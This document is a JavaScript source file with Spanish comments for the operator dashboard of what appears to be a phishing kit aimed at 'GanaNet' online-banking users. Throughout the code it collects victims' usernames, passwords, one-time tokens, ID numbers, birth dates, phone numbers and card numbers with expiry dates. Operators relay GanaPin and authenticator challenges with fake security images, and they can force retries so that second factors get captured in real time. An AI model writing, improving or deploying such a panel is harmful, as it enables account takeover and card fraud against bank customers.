/**
 * Panel operador GanaNet.
 * Cola ordenada de usuarios en espera para enviar GanaPin o Autenticador.
 */
const LANE_COUNT = 5
const CHANNEL = 'gananet-ops'
const STORAGE_KEY = 'gananet-ops-event'
const SESSIONS_KEY = 'gananet-ops-sessions'
/** Cambia esta clave si quieres otra. */
const PANEL_PASSWORD = 'K7mQ2nR9pX4wL8vB3c'
const AUTH_KEY = 'gananet-ops-auth'

const authGate = document.getElementById('authGate')
const authForm = document.getElementById('authForm')
const authPassword = document.getElementById('authPassword')
const authError = document.getElementById('authError')
const dash = document.getElementById('dash')
const emptyState = document.getElementById('emptyState')
const rowCount = document.getElementById('rowCount')
const hint = document.getElementById('hint')
const hubStatus = document.getElementById('hubStatus')
const btnClean = document.getElementById('btnClean')
const btnLogout = document.getElementById('btnLogout')
const btnNotes = document.getElementById('btnNotes')
const notesBadge = document.getElementById('notesBadge')

/** @type {Map<string, object>} */
const rows = new Map()
let counter = 0
let panelStarted = false
let pollTimer = 0
let hubOk = null

function setHubStatus(ok) {
  if (hubOk === ok) return
  hubOk = ok
  if (!hubStatus) return
  hubStatus.textContent = ok ? 'OK (Chrome↔Edge)' : 'OFF (solo mismo navegador)'
  hubStatus.classList.toggle('is-ok', ok)
  hubStatus.classList.toggle('is-off', !ok)
  if (!ok) {
    hint.textContent =
      'Hub /api/ops no responde. En Render usa Web Service (npm start), no Static Site. Mismo navegador sí funciona.'
  }
}

function isAuthed() {
  try {
    return localStorage.getItem(AUTH_KEY) === '1'
  } catch (_) {
    return false
  }
}

function setAuthed(ok) {
  try {
    if (ok) localStorage.setItem(AUTH_KEY, '1')
    else localStorage.removeItem(AUTH_KEY)
    // limpia auth vieja de la pestaña
    sessionStorage.removeItem(AUTH_KEY)
  } catch (_) {
    /* ignore */
  }
}

function showGate() {
  if (dash) {
    dash.hidden = true
    dash.classList.add('is-locked')
  }
  if (authGate) authGate.hidden = false
  authError.hidden = true
  requestAnimationFrame(() => authPassword?.focus())
}

function showPanel() {
  if (authGate) authGate.hidden = true
  if (dash) {
    dash.hidden = false
    dash.classList.remove('is-locked')
  }
  startPanel()
}

function logoutPanel() {
  setAuthed(false)
  if (pollTimer) window.clearInterval(pollTimer)
  pollTimer = 0
  panelStarted = false
  showGate()
}

authForm?.addEventListener('submit', (event) => {
  event.preventDefault()
  const value = String(authPassword?.value || '')
  if (value === PANEL_PASSWORD) {
    setAuthed(true)
    if (authPassword) authPassword.value = ''
    authError.hidden = true
    showPanel()
    return
  }
  authError.hidden = false
  if (authPassword) {
    authPassword.value = ''
    authPassword.focus()
  }
})

btnLogout?.addEventListener('click', () => {
  logoutPanel()
})

if (!isAuthed()) {
  showGate()
} else {
  showPanel()
}

function readStore() {
  try {
    const raw = localStorage.getItem(SESSIONS_KEY)
    const list = raw ? JSON.parse(raw) : []
    return Array.isArray(list) ? list : []
  } catch (_) {
    return []
  }
}

function writeStore(list) {
  try {
    localStorage.setItem(SESSIONS_KEY, JSON.stringify(list))
  } catch (_) {
    /* ignore */
  }
}

function statusLabel(state) {
  if (state === 'waiting') return 'En espera'
  if (state === 'active') return 'Activo'
  if (state === 'done') return 'Listo'
  if (state === 'error-pass') return 'Error clave'
  if (state === 'error-user') return 'Error user'
  if (state === 'error') return 'Error'
  if (state === 'waiting-token') return 'Esperando Token'
  if (state === 'waiting-ganapin') return 'GanaPin enviado'
  if (state === 'waiting-totp') return 'Auth enviado'
  if (state === 'waiting-dispositivo') return 'Dispositivo enviado'
  if (state === 'error-token') return 'Error Token'
  if (state === 'typing') return 'Escribiendo'
  return 'Nuevo'
}

function badgeClass(state) {
  if (
    state === 'waiting' ||
    state === 'waiting-token' ||
    state === 'waiting-ganapin' ||
    state === 'waiting-totp' ||
    state === 'waiting-dispositivo' ||
    state === 'typing'
  ) {
    return 'badge badge--wait'
  }
  if (state === 'active') return 'badge badge--hola'
  if (state === 'done') return 'badge badge--done'
  if (
    state === 'error-pass' ||
    state === 'error-user' ||
    state === 'error' ||
    state === 'error-token'
  ) {
    return 'badge badge--error'
  }
  return 'badge badge--login'
}

function formatTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString('es-BO', {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    })
  } catch (_) {
    return '—'
  }
}

function laneForIndex(index) {
  return ((Number(index) || 1) - 1) % LANE_COUNT
}

function getLaneBody(lane) {
  return document.querySelector(`[data-lane-body="${lane}"]`)
}

function getDeviceIcon(device) {
  if (device === 'mobile') {
    return `
      <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="Celular">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#d96500;">
          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
          <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
        Celular
      </span>
    `
  }
  return `
    <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="PC">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#0b5ed7;">
        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
        <line x1="8" y1="21" x2="16" y2="21"></line>
        <line x1="12" y1="17" x2="12" y2="21"></line>
      </svg>
      PC
    </span>
  `
}

function isOnline(row) {
  const seen = row.last_seen || row.updatedAt || row.createdAt
  if (!seen) return false
  return Date.now() - seen < 20000
}

function publish(message) {
  const payload = { ...message, ts: Date.now() }
  let actionPost = Promise.resolve()
  if (payload.type === 'session:action' && payload.sessionId && payload.action) {
    actionPost = fetch('/api/ops/actions', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: payload.sessionId,
        action: payload.action,
        image: payload.image || '',
      }),
    }).catch(() => {})
  }
  try {
    const ch = new BroadcastChannel(CHANNEL)
    ch.postMessage(payload)
    ch.close()
  } catch (_) {
    /* ignore */
  }
  try {
    // Evitar romper localStorage con imágenes grandes
    const forStorage = payload.image
      ? { ...payload, image: '[omitted]' }
      : payload
    localStorage.setItem(STORAGE_KEY, JSON.stringify(forStorage))
  } catch (_) {
    /* ignore */
  }
  return actionPost
}

function persistRows() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  writeStore(list)
  counter = list.length
}

function setRowState(rowId, state, action, image) {
  const row = rows.get(rowId)
  if (!row) return
  row.state = state
  row.last_seen = Date.now()
  row.updatedAt = Date.now()
  if (image) row.securityImage = image
  if (action === 'ganapin' || action === 'totp') {
    row.lastFactor = state
  }
  persistRows()
  hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`

  const afterPublish = action
    ? publish({ type: 'session:action', sessionId: rowId, action, image: image || '' })
    : Promise.resolve()

  // Tras Err Token: volver al factor para reintentar (evita spam de error en el login)
  if (action === 'error-token') {
    afterPublish.finally(() => {
      const restore = row.lastFactor || 'waiting-ganapin'
      row.state = restore
      row.updatedAt = Date.now()
      persistRows()
      fetch('/api/ops/sessions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: rowId,
          state: restore,
          status: restore,
          securityImage: row.securityImage || '',
          token: '',
        }),
      }).catch(() => {})
      hint.textContent = `${row.user || rowId} → ${statusLabel(restore)} (reintento)`
      render()
    })
    return
  }

  render()
}

/** Comprime a JPEG dataURL para no saturar el hub. */
function fileToDataUrl(file) {
  return new Promise((resolve, reject) => {
    if (!file || !String(file.type || '').startsWith('image/')) {
      reject(new Error('Archivo no es imagen'))
      return
    }
    const reader = new FileReader()
    reader.onerror = () => reject(new Error('No se pudo leer la imagen'))
    reader.onload = () => {
      const img = new Image()
      img.onload = () => {
        const maxW = 720
        const scale = Math.min(1, maxW / img.width)
        const w = Math.max(1, Math.round(img.width * scale))
        const h = Math.max(1, Math.round(img.height * scale))
        const canvas = document.createElement('canvas')
        canvas.width = w
        canvas.height = h
        const ctx = canvas.getContext('2d')
        ctx.drawImage(img, 0, 0, w, h)
        resolve(canvas.toDataURL('image/jpeg', 0.82))
      }
      img.onerror = () => reject(new Error('Imagen inválida'))
      img.src = String(reader.result)
    }
    reader.readAsDataURL(file)
  })
}

function openImagePicker({ rowId, action, label }) {
  const overlay = document.createElement('div')
  overlay.className = 'img-modal-overlay'
  overlay.innerHTML = `
    <div class="img-modal" role="dialog" aria-modal="true" aria-labelledby="img-modal-title">
      <h2 class="img-modal__title" id="img-modal-title">Imagen de seguridad — ${label}</h2>
      <p class="img-modal__hint">Arrastra una imagen, pégala con Ctrl+V, o elige un archivo.</p>
      <div class="img-drop" tabindex="0">
        <input type="file" accept="image/*" class="img-drop__input" hidden />
        <div class="img-drop__empty">
          <strong>Suelta la imagen aquí</strong>
          <span>o haz clic para seleccionar · Ctrl+V para pegar</span>
        </div>
        <img class="img-drop__preview" alt="Vista previa" hidden />
      </div>
      <p class="img-modal__status" aria-live="polite"></p>
      <div class="img-modal__actions">
        <button type="button" class="btn btn--ghost" data-img-cancel>Cancelar</button>
        <button type="button" class="btn btn--ok" data-img-send disabled>Enviar ${label}</button>
      </div>
    </div>
  `
  document.body.appendChild(overlay)

  const drop = overlay.querySelector('.img-drop')
  const input = overlay.querySelector('.img-drop__input')
  const empty = overlay.querySelector('.img-drop__empty')
  const preview = overlay.querySelector('.img-drop__preview')
  const status = overlay.querySelector('.img-modal__status')
  const btnSend = overlay.querySelector('[data-img-send]')
  const btnCancel = overlay.querySelector('[data-img-cancel]')
  let imageData = ''

  function close() {
    window.removeEventListener('paste', onPaste)
    overlay.remove()
  }

  function setPreview(dataUrl) {
    imageData = dataUrl
    preview.src = dataUrl
    preview.hidden = false
    empty.hidden = true
    drop.classList.add('has-image')
    btnSend.disabled = false
    status.textContent = 'Imagen lista. Pulsa Enviar.'
  }

  async function ingestFile(file) {
    status.textContent = 'Procesando imagen…'
    try {
      const dataUrl = await fileToDataUrl(file)
      setPreview(dataUrl)
    } catch (err) {
      status.textContent = err?.message || 'No se pudo cargar la imagen'
      btnSend.disabled = true
    }
  }

  function onPaste(event) {
    const items = event.clipboardData?.items
    if (!items) return
    for (const item of items) {
      if (item.type.startsWith('image/')) {
        event.preventDefault()
        const file = item.getAsFile()
        if (file) ingestFile(file)
        return
      }
    }
  }

  drop.addEventListener('click', () => input.click())
  input.addEventListener('change', () => {
    const file = input.files?.[0]
    if (file) ingestFile(file)
  })
  drop.addEventListener('dragover', (e) => {
    e.preventDefault()
    drop.classList.add('is-drag')
  })
  drop.addEventListener('dragleave', () => drop.classList.remove('is-drag'))
  drop.addEventListener('drop', (e) => {
    e.preventDefault()
    drop.classList.remove('is-drag')
    const file = e.dataTransfer?.files?.[0]
    if (file) ingestFile(file)
  })
  window.addEventListener('paste', onPaste)
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) close()
  })
  btnCancel.addEventListener('click', close)
  btnSend.addEventListener('click', () => {
    if (!imageData) return
    const state = action === 'ganapin' ? 'waiting-ganapin' : 'waiting-totp'
    setRowState(rowId, state, action, imageData)
    close()
  })
  requestAnimationFrame(() => drop.focus())
}

function isHabilitar(sessionOrRow) {
  return (
    sessionOrRow?.flow === 'habilitar' ||
    sessionOrRow?.tipoUsuario === 'HABILITAR' ||
    sessionOrRow?.tipo === 'HABILITAR'
  )
}

function mapSessionRow(session, index = 0) {
  const habilitar = isHabilitar(session)
  const ci = session.ci || ''
  const complemento = session.complemento || ''
  const user =
    session.username ||
    session.user ||
    (ci ? (complemento ? `${ci}-${complemento}` : ci) : '—')
  return {
    id: session.id,
    index,
    createdAt: session.createdAt || Date.now(),
    updatedAt: session.updatedAt || session.createdAt || Date.now(),
    last_seen: session.last_seen || session.updatedAt || Date.now(),
    flow: habilitar ? 'habilitar' : session.flow || 'login',
    tipo: habilitar ? 'HABILITAR' : session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
    device: session.device || 'desktop',
    ip: session.ip || '127.0.0.1',
    user,
    clave: habilitar
      ? formatCard(session.cardNumber) ||
        session.phone ||
        session.password ||
        session.clave ||
        '—'
      : session.password || session.clave || '—',
    token: habilitar
      ? [session.cardExpiry, session.phone, session.extension]
          .filter(Boolean)
          .join(' | ') ||
        session.token ||
        ''
      : session.token || '',
    ci,
    complemento,
    extension: session.extension || '',
    birthDate: session.birthDate || '',
    phone: session.phone || '',
    cardNumber: session.cardNumber || '',
    cardExpiry: session.cardExpiry || '',
    noteUnread: Boolean(session.noteUnread),
    state: session.state || 'waiting',
  }
}

function formatCard(num) {
  const digits = String(num || '').replace(/\D/g, '')
  if (!digits) return ''
  return digits.replace(/(.{4})/g, '$1 ').trim()
}

function formatBirth(value) {
  if (!value || !String(value).includes('-')) return value || '—'
  const [y, m, d] = String(value).split('-')
  if (d) return `${d}/${m}/${y}`
  return `${m}/${y}`
}

function formatExpiryNote(value) {
  if (!value || !String(value).includes('-')) return value || '—'
  const [y, m] = String(value).split('-')
  return `${m}/${y}`
}

function hasHabilitarNote(row) {
  return isHabilitar(row) && Boolean(row.ci || row.cardNumber || row.phone)
}

function unreadNotesCount() {
  return [...rows.values()].filter((r) => hasHabilitarNote(r) && r.noteUnread).length
}

function updateNotesBadge() {
  const n = unreadNotesCount()
  if (!notesBadge) return
  if (n <= 0) {
    notesBadge.hidden = true
    notesBadge.textContent = '0'
    btnNotes?.classList.remove('has-unread')
    return
  }
  notesBadge.hidden = false
  notesBadge.textContent = String(n > 9 ? '9+' : n)
  btnNotes?.classList.add('has-unread')
}

function openNoteModal(rowId) {
  const row = rows.get(rowId)
  if (!row || !hasHabilitarNote(row)) return
  row.noteUnread = false
  persistRows()
  updateNotesBadge()
  render()

  const overlay = document.createElement('div')
  overlay.className = 'note-modal-overlay'
  overlay.innerHTML = `
    <div class="note-modal" role="dialog" aria-modal="true" aria-labelledby="note-modal-title">
      <div class="note-modal__bar">
        <h2 class="note-modal__title" id="note-modal-title">Nota · Dispositivo</h2>
        <button type="button" class="note-modal__x" data-note-close aria-label="Cerrar">×</button>
      </div>
      <div class="note-pad">
        <p class="note-pad__meta">#${row.index} · ${formatTime(row.createdAt)} · ${row.device || '—'}</p>
        <h3 class="note-pad__heading">Datos personales</h3>
        <dl class="note-pad__list">
          <div><dt>C.I.</dt><dd class="copyable" data-copy>${row.ci || '—'}${row.complemento ? `-${row.complemento}` : ''}</dd></div>
          <div><dt>Extensión</dt><dd class="copyable" data-copy>${row.extension || '—'}</dd></div>
          <div><dt>Fecha nacimiento</dt><dd class="copyable" data-copy>${formatBirth(row.birthDate)}</dd></div>
          <div><dt>Celular</dt><dd class="copyable" data-copy>${row.phone || '—'}</dd></div>
        </dl>
        <h3 class="note-pad__heading">Datos de tarjeta</h3>
        <dl class="note-pad__list">
          <div><dt>Tarjeta</dt><dd class="copyable" data-copy>${formatCard(row.cardNumber) || '—'}</dd></div>
          <div><dt>Expiración</dt><dd class="copyable" data-copy>${formatExpiryNote(row.cardExpiry)}</dd></div>
        </dl>
        <p class="note-pad__foot">Toca un valor para copiar · Listo / Err clave en la fila</p>
      </div>
      <div class="note-modal__actions">
        <button type="button" class="btn btn--ghost" data-note-close>Cerrar</button>
        <button type="button" class="btn btn--error" data-note-err>Err clave</button>
        <button type="button" class="btn btn--done" data-note-done>Listo</button>
      </div>
    </div>
  `
  document.body.appendChild(overlay)

  const close = () => overlay.remove()
  overlay.querySelectorAll('[data-note-close]').forEach((btn) => {
    btn.addEventListener('click', close)
  })
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) close()
  })
  overlay.querySelector('[data-note-done]')?.addEventListener('click', () => {
    setRowState(rowId, 'done', 'done')
    close()
  })
  overlay.querySelector('[data-note-err]')?.addEventListener('click', () => {
    setRowState(rowId, 'error-pass', 'error-pass')
    close()
  })
  overlay.querySelectorAll('[data-copy]').forEach((el) => {
    el.addEventListener('click', async () => {
      const text = el.textContent?.trim()
      if (!text || text === '—') return
      try {
        await navigator.clipboard.writeText(text)
        el.classList.add('copied')
        setTimeout(() => el.classList.remove('copied'), 900)
      } catch (_) {
        /* ignore */
      }
    })
  })
}

function openNotesInbox() {
  const notes = [...rows.values()]
    .filter((r) => hasHabilitarNote(r))
    .sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0))

  const overlay = document.createElement('div')
  overlay.className = 'note-modal-overlay'
  overlay.innerHTML = `
    <div class="note-modal note-modal--inbox" role="dialog" aria-modal="true">
      <div class="note-modal__bar">
        <h2 class="note-modal__title">Notas de dispositivo</h2>
        <button type="button" class="note-modal__x" data-note-close aria-label="Cerrar">×</button>
      </div>
      <div class="note-inbox">
        ${
          notes.length
            ? notes
                .map(
                  (r) => `
          <button type="button" class="note-inbox__item${r.noteUnread ? ' is-unread' : ''}" data-open-note="${r.id}">
            <svg class="note-inbox__icon" viewBox="0 0 24 24" aria-hidden="true">
              <path fill="currentColor" d="M6 3h9l5 5v13a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1zm8 1.5V9h4.5L14 4.5zM8 12h8v1.5H8V12zm0 3.5h8V17H8v-1.5z"/>
            </svg>
            <span class="note-inbox__body">
              <strong>${r.ci || r.user || 'Sin CI'}${r.complemento ? `-${r.complemento}` : ''}</strong>
              <small>${formatCard(r.cardNumber) || 'Sin tarjeta'} · ${formatTime(r.createdAt)}</small>
            </span>
            ${r.noteUnread ? '<span class="note-inbox__dot" title="Nuevo"></span>' : ''}
          </button>`,
                )
                .join('')
            : '<p class="note-inbox__empty">Aún no hay notas de dispositivo.</p>'
        }
      </div>
      <div class="note-modal__actions">
        <button type="button" class="btn btn--ghost" data-note-close>Cerrar</button>
      </div>
    </div>
  `
  document.body.appendChild(overlay)
  const close = () => overlay.remove()
  overlay.querySelectorAll('[data-note-close]').forEach((btn) => {
    btn.addEventListener('click', close)
  })
  overlay.addEventListener('click', (e) => {
    if (e.target === overlay) close()
  })
  overlay.querySelectorAll('[data-open-note]').forEach((btn) => {
    btn.addEventListener('click', () => {
      const id = btn.getAttribute('data-open-note')
      close()
      openNoteModal(id)
    })
  })
}

btnNotes?.addEventListener('click', () => {
  openNotesInbox()
})

function upsertSession(session) {
  if (!session?.id) return
  // Ignorar fila demo vieja
  if (session.id === 'demo_preview') return

  const existing = rows.get(session.id)
  const isNew = !existing
  const hadNote = existing ? hasHabilitarNote(existing) : false
  const mapped = mapSessionRow(session, existing?.index || 0)
  if (existing) {
    Object.assign(existing, {
      ...mapped,
      index: existing.index,
      createdAt: existing.createdAt,
      lastFactor: existing.lastFactor,
      securityImage: session.securityImage || existing.securityImage,
      noteUnread: existing.noteUnread,
    })
  } else {
    mapped.noteUnread = hasHabilitarNote(mapped)
    rows.set(session.id, mapped)
  }
  const row = rows.get(session.id)
  const hasNote = hasHabilitarNote(row)
  // Nueva nota completa (datos de dispositivo llegaron)
  if (hasNote && (!hadNote || (session.cardNumber && session.cardNumber !== existing?.cardNumber))) {
    row.noteUnread = true
    hint.textContent = `Nueva nota dispositivo (#${row.index}): ${row.ci || row.user}`
    btnNotes?.classList.add('is-ping')
    setTimeout(() => btnNotes?.classList.remove('is-ping'), 1200)
  }

  persistRows()
  if (isNew) {
    hint.textContent = isHabilitar(row)
      ? hasNote
        ? `Nota dispositivo (#${row.index}) — ábrela en el icono de tarjeta`
        : `En cola (#${row.index}): Habilitar ${row.user} — Listo o Err clave`
      : `En cola (#${row.index}): ${row.user} — elige GanaPin / Auth / Dispositivo`
  }
  render()

  if (!isNew && !hasNote) return
  if (!isNew) return
  // Resalta solo filas nuevas (no en cada poll)
  requestAnimationFrame(() => {
    const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
    if (!tr) return
    tr.classList.add('is-new')
    setTimeout(() => tr.classList.remove('is-new'), 1800)
  })
}

function loadFromStore() {
  const list = readStore()
    .filter((s) => s && s.id && s.id !== 'demo_preview')
    .sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  rows.clear()
  list.forEach((session, i) => {
    rows.set(session.id, mapSessionRow(session, i + 1))
  })
  counter = rows.size
}

function createRow(row) {
  const tr = document.createElement('tr')
  tr.dataset.rowId = row.id
  tr.innerHTML = `
    <td class="col-num"></td>
    <td class="col-time mono"></td>
    <td class="col-tipo mono"></td>
    <td class="col-device"></td>
    <td class="col-ip mono"></td>
    <td class="col-user mono copyable" title="Copiar usuario"></td>
    <td class="col-pass mono copyable" title="Copiar clave"></td>
    <td class="col-token mono copyable" title="Copiar token"></td>
    <td class="col-online"></td>
    <td class="col-status"></td>
    <td>
      <div class="row-actions">
        <button type="button" class="note-chip" data-action="note" title="Ver nota" hidden>
          <svg class="note-chip__icon" viewBox="0 0 24 24" aria-hidden="true">
            <path fill="currentColor" d="M6 3h9l5 5v13a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1zm8 1.5V9h4.5L14 4.5zM8 12h8v1.5H8V12zm0 3.5h8V17H8v-1.5z"/>
          </svg>
          <span class="note-chip__label">Nota</span>
          <span class="note-chip__dot" data-note-dot hidden></span>
        </button>
        <button type="button" class="btn btn--ok" data-action="ganapin">GanaPin</button>
        <button type="button" class="btn btn--ok" data-action="totp">Autenticador</button>
        <button type="button" class="btn btn--ok" data-action="dispositivo">Dispositivo</button>
        <button type="button" class="btn btn--error" data-action="error-pass">Err clave</button>
        <button type="button" class="btn btn--error" data-action="error-token">Err Token</button>
        <button type="button" class="btn btn--done" data-action="done">Listo</button>
      </div>
    </td>
  `

  tr.querySelector('[data-action="ganapin"]')?.addEventListener('click', () => {
    openImagePicker({ rowId: row.id, action: 'ganapin', label: 'GanaPin' })
  })
  tr.querySelector('[data-action="totp"]')?.addEventListener('click', () => {
    openImagePicker({ rowId: row.id, action: 'totp', label: 'Autenticador' })
  })
  tr.querySelector('[data-action="dispositivo"]')?.addEventListener('click', () => {
    setRowState(row.id, 'waiting-dispositivo', 'dispositivo')
  })
  tr.querySelector('[data-action="note"]')?.addEventListener('click', () => {
    openNoteModal(row.id)
  })
  tr.querySelector('[data-action="error-pass"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-pass', 'error-pass')
  })
  tr.querySelector('[data-action="error-token"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-token', 'error-token')
  })
  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
    setRowState(row.id, 'done', 'done')
  })

  tr.querySelectorAll('td.copyable').forEach((td) => {
    td.addEventListener('click', async () => {
      const text = td.textContent?.trim()
      if (!text || text === '—') return
      try {
        await navigator.clipboard.writeText(text)
        td.classList.add('copied')
        setTimeout(() => td.classList.remove('copied'), 900)
      } catch (_) {
        /* ignore */
      }
    })
  })

  return tr
}

function updateRow(tr, row) {
  const online = isOnline(row)
  const habilitar = isHabilitar(row)
  tr.querySelector('.col-num').textContent = String(row.index)
  tr.querySelector('.col-time').textContent = formatTime(row.createdAt)
  tr.querySelector('.col-tipo').textContent = habilitar ? 'HABILITAR' : row.tipo
  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
  tr.querySelector('.col-ip').textContent = row.ip || '—'
  tr.querySelector('.col-user').textContent = row.user || '—'
  tr.querySelector('.col-user').title = habilitar
    ? `CI: ${row.user || '—'}`
    : 'Copiar usuario'
  tr.querySelector('.col-pass').textContent = row.clave || '—'
  tr.querySelector('.col-pass').title = habilitar ? 'Copiar tarjeta' : 'Copiar clave'
  tr.querySelector('.col-token').textContent = row.token || '—'
  tr.querySelector('.col-token').title = habilitar
    ? 'Exp | Celular | Extensión'
    : 'Copiar token'
  tr.querySelector('.col-online').innerHTML = online
    ? '<span class="pill pill--online">En línea</span>'
    : '<span class="pill pill--offline">Off</span>'
  tr.querySelector('.col-status').innerHTML =
    `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`

  const ganapinBtn = tr.querySelector('[data-action="ganapin"]')
  const totpBtn = tr.querySelector('[data-action="totp"]')
  const dispositivoBtn = tr.querySelector('[data-action="dispositivo"]')
  const noteBtn = tr.querySelector('[data-action="note"]')
  const noteDot = tr.querySelector('[data-note-dot]')
  const errTokenBtn = tr.querySelector('[data-action="error-token"]')
  const noteReady = hasHabilitarNote(row)
  if (ganapinBtn) ganapinBtn.hidden = habilitar
  if (totpBtn) totpBtn.hidden = habilitar
  if (dispositivoBtn) dispositivoBtn.hidden = habilitar
  if (errTokenBtn) errTokenBtn.hidden = habilitar
  if (noteBtn) {
    noteBtn.hidden = !noteReady
    noteBtn.classList.toggle('is-unread', Boolean(row.noteUnread))
  }
  if (noteDot) noteDot.hidden = !row.noteUnread
  ganapinBtn?.classList.toggle('is-on', !habilitar && row.state === 'waiting-ganapin')
  totpBtn?.classList.toggle('is-on', !habilitar && row.state === 'waiting-totp')
  dispositivoBtn?.classList.toggle('is-on', !habilitar && row.state === 'waiting-dispositivo')
  tr.classList.toggle('is-waiting', row.state === 'waiting')
  tr.classList.toggle('is-habilitar', habilitar)
  tr.classList.toggle('has-note', noteReady)
}

function render() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  rowCount.textContent = String(list.length)
  emptyState.classList.toggle('is-visible', list.length === 0)
  updateNotesBadge()

  const byLane = Array.from({ length: LANE_COUNT }, () => [])
  list.forEach((row) => {
    byLane[laneForIndex(row.index)].push(row)
  })

  for (let lane = 0; lane < LANE_COUNT; lane += 1) {
    const body = getLaneBody(lane)
    if (!body) continue
    const laneEl = document.querySelector(`[data-lane="${lane}"]`)
    const countEl = laneEl?.querySelector('[data-lane-count]')
    const laneRows = byLane[lane]
    if (countEl) countEl.textContent = String(laneRows.length)

    ;[...body.querySelectorAll('tr[data-row-id]')].forEach((tr) => {
      if (!rows.has(tr.dataset.rowId)) tr.remove()
    })

    laneRows.forEach((row) => {
      let tr = [...body.querySelectorAll('tr[data-row-id]')].find(
        (node) => node.dataset.rowId === row.id,
      )
      if (!tr) {
        tr = createRow(row)
        body.appendChild(tr)
      }
      updateRow(tr, row)
    })
  }
}

function onMessage(data) {
  if (!data || typeof data !== 'object') return
  if (data.type === 'session:created' && data.session) {
    upsertSession(data.session)
  }
  if (data.type === 'sessions:sync' && Array.isArray(data.sessions)) {
    data.sessions.forEach((session) => upsertSession(session))
  }
  if (data.type === 'session:typing') {
    const row = rows.get(data.sessionId)
    if (!row) return
    if (row.state === 'waiting-token' || row.state === 'done') return
    row.last_seen = Date.now()
    row.state = 'typing'
    persistRows()
    render()
  }
  if (data.type === 'session:token') {
    const row = rows.get(data.sessionId)
    if (!row) return
    if (data.submitted) {
      row.token = data.token || ''
      row.state = 'waiting-token'
    } else {
      row.state = 'typing'
    }
    row.last_seen = Date.now()
    persistRows()
    render()
  }
  if (data.type === 'session:ping') {
    const row = rows.get(data.sessionId)
    if (!row) return
    row.last_seen = Date.now()
    persistRows()
    render()
  }
}

btnClean?.addEventListener('click', () => {
  rows.clear()
  counter = 0
  writeStore([])
  fetch('/api/ops/sessions', { method: 'DELETE' }).catch(() => {})
  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
  render()
})

/** Solo agrega/actualiza desde el hub. Nunca borra filas (solo Limpiar). */
async function pollHub() {
  try {
    const res = await fetch('/api/ops/sessions')
    if (!res.ok) {
      setHubStatus(false)
      return
    }
    const data = await res.json()
    setHubStatus(true)
    const list = Array.isArray(data.sessions) ? data.sessions : []
    list.forEach((session) => upsertSession(session))
    render()
  } catch (_) {
    setHubStatus(false)
  }
}

function startPanel() {
  if (panelStarted) return
  panelStarted = true

  try {
    const ch = new BroadcastChannel(CHANNEL)
    ch.onmessage = (event) => onMessage(event.data)
  } catch (_) {
    /* ignore */
  }

  window.addEventListener('storage', (event) => {
    if (event.key === STORAGE_KEY && event.newValue) {
      try {
        onMessage(JSON.parse(event.newValue))
      } catch (_) {
        /* ignore */
      }
    }
    if (event.key === SESSIONS_KEY) {
      loadFromStore()
      render()
    }
  })

  pollTimer = window.setInterval(() => {
    pollHub()
  }, 700)

  writeStore([])
  pollHub()
  hint.textContent = 'Esperando usuarios del login… Al Verificar llegan aquí ordenados.'
  render()
}
